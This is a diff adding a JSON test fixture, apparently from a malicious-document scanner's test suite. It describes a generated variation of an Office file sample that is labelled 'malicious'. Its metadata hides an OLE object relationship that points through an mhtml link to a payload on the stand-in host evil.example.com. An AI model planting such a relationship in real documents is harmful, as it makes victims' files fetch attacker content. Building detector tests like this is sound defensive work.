@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::93::binary-variations::3",
+  "base_sample_id": "exp::document-office::93",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -945527796,
+  "content": "{\n  \"format\": \"office\",\n  \"coreProperties\": {\n    \"cp:category\": \"<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\",\n    \"dc:creator\": \"John Doe\",\n    \"cp:lastModifiedBy\": \"Jane Smith\",\n    \"dcterms:created\": \"2026-01-15T10:30:00Z\"\n  }\n}",
+  "content_hash": "f4106142b811bf2b7fdec7cdf8563954f2d5f35a2bec0dd9a042771243b57a6d",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-properties",
+  "difficulty": "advanced"
+}
